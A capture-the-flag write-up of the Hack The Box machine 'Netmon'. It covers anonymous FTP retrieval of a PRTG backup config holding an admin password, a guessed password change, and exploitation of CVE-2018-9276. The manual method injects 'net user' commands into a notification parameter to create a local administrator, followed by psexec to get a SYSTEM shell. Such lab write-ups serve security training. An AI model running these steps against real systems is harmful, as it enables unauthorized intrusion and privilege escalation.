# Netmon

### Summary:

* Backup configuration file (/programdata/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak) contains the previously password(PrTg@dmin2018).
* Using the creds: (prtgadmin:PrTg@dmin2019), I managed to login to the administrator console.
* Able to use PRTG Authenticated RCE to obtain a NT Authority\System shell

### Nmap

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.152]
└─# nmap -p- --min-rate 5000 -Pn 10.10.10.152 -oN all_ports.nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 20:04 EDT
Nmap scan report for 10.10.10.152
Host is up (0.17s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.61 seconds
```

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.152]
└─# nmap -p 21,80,135,139,445,5985 -A --min-rate 5000 -Pn 10.10.10.152 -oN aggr.nmap     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 20:05 EDT
Nmap scan report for 10.10.10.152
Host is up (0.16s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-04-23T00:05:28
|_  start_date: 2023-04-23T00:02:15
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   164.43 ms 10.10.14.1
2   164.75 ms 10.10.10.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.19 seconds

```

### HTTP

[http://10.10.10.152/index.htm](http://10.10.10.152/index.htm)

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

Notice that port 80 is running PRTG Network Monitor page.

### FTP

Allows anonymous login

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.152]
└─# ftp 10.10.10.152                          
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49853|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.

```

Since port 80 is running PRTG Network Monitor page, let's search for PRTG admin credentials on the FTP server.

{% embed url="https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data" %}

Data Directory:&#x20;

* %programdata%\Paessler\PRTG Network Monitor
* "/programdata/Paessler/PRTG Network Monitor"

```bash
ftp> cd "/programdata/Paessler/PRTG Network Monitor"
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||51224|)
125 Data connection already open; Transfer starting.
04-22-23  08:44PM       <DIR>          Configuration Auto-Backups
04-22-23  08:03PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
04-22-23  08:03PM       <DIR>          Logs (Web Server)
04-22-23  08:08PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
04-22-23  09:26PM              1698128 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.

```

Obtain the configuration files

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.152]
└─# wget ftp://anonymous:anonymous@10.10.10.152/"programdata/Paessler/PRTG Network Monitor/PRTG Configuration.*"
--2023-04-22 21:49:43--  ftp://anonymous:*password*@10.10.10.152/programdata/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.*
           => ‘.listing’
Connecting to 10.10.10.152:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD (1) /programdata/Paessler/PRTG Network Monitor ... done.
==> PASV ... done.    ==> LIST ... done.

.listing                               [ <=>                                                          ]     889  --.-KB/s    in 0s      

==> PASV ... done.    ==> LIST ... done.

.listing                               [ <=>                                                          ]     889  --.-KB/s    in 0s      

2023-04-22 21:49:45 (75.5 MB/s) - ‘.listing’ saved [1778]

Removed ‘.listing’.
...
--2023-04-22 21:49:50--  ftp://anonymous:*password*@10.10.10.152/programdata/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.old.bak
           => ‘PRTG Configuration.old.bak’
==> CWD not required.
==> PASV ... done.    ==> RETR PRTG Configuration.old.bak ... done.
Length: 1153755 (1.1M)

PRTG Configuration.old.bak         100%[=============================================================>]   1.10M   247KB/s    in 5.2s    

2023-04-22 21:49:56 (215 KB/s) - ‘PRTG Configuration.old.bak’ saved [1153755]
```

Inside "PRTG Configuration.old.bak",&#x20;

```bash
140             <dbpassword>
141           <!-- User: prtgadmin -->
142           PrTg@dmin2018
143             </dbpassword>
```

Trying out the creds on the admin page, I was unable to login.&#x20;

However, since the credentials were found in the backup file, I decided to increment the year from 2018 to 2019.

Therefore, using the new creds (prtgadmin:PrTg@dmin2019), I was able to login to the administrator console.

<figure><img src="../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

### Prtgadmin Authenticated RCE

Using the link, [https://github.com/shk0x/PRTG-Network-Monitor-RCE](https://github.com/shk0x/PRTG-Network-Monitor-RCE)

```bash
┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.152/PRTG-Network-Monitor-RCE]
└─# git clone https://github.com/shk0x/PRTG-Network-Monitor-RCE.git
Cloning into 'PRTG-Network-Monitor-RCE'...
remote: Enumerating objects: 9, done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 9
Receiving objects: 100% (9/9), 4.07 KiB | 4.07 MiB/s, done.

┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.152/PRTG-Network-Monitor-RCE]
└─# chmod +x prtg-exploit.sh 

```

Go to the PRTG Admin page and copy out the various cookies.

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.152/PRTG-Network-Monitor-RCE]
└─# ./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.362998484.1682208516; _gid=GA1.4.1269743256.1682208516; OCTOPUS1813713946=ezhGMzRBNDMzLTA4Q0UtNDA4MS1BOTI3LTIwQjk2QkVBQzY2Rn0%3D"

[+]#########################################################################[+] 
[*] PRTG RCE script by M4LV0                                                [*] 
[+]#########################################################################[+] 
[*] https://github.com/M4LV0                                                [*] 
[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution  CVE-2018-9276 [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and add it to the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....

 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 

```

Newly created local admin: pentest:P3nT3st

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.152]
└─# impacket-psexec pentest@10.10.10.152                                       
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file dBAiQLGv.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service cmPL on 10.10.10.152.....
[*] Starting service cmPL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### Manual Method: PRTG Authenticated RCE

After logging into the PRTG admin console,

* Setup --> notifications

<figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

On the right hand side,

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

Scroll down and Toggle the execute program switch.

Select "Demo exe notification - outfile.ps1" as the Program File.

Type in "test.txt;net user bob P@ssw0rd /add;net localgroup administrators bob /add;" as the Parameter.

Click Save

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

Click on the Editing button (pen on notebook icon) and click on the "Send Test Notification" button (bell icon).

<figure><img src="../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Now, the new user named bob is created and added to the local administrators group

Using the creds (bob:P@ssw0rd),

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.152]
└─# impacket-psexec bob@10.10.10.152
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file ArvSkHTP.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service JHxA on 10.10.10.152.....
[*] Starting service JHxA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```
